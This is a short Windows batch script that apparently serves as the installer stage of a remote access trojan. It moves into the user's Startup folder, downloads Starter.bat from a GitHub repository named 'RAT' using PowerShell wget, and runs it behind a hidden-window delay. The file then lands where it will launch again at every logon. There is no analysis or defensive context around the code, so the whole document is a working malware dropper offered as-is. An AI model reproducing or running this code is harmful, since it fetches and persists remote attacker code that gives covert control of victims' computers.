@echo off
set "currentd=%cd%"
set "username=saifa"
set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %targetd%
powershell powershell.exe "wget https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
powershell powershell.exe -windowstyle hidden timeout 5
powershell ./Starter.bat
cd %currentd%
@rem del init.bat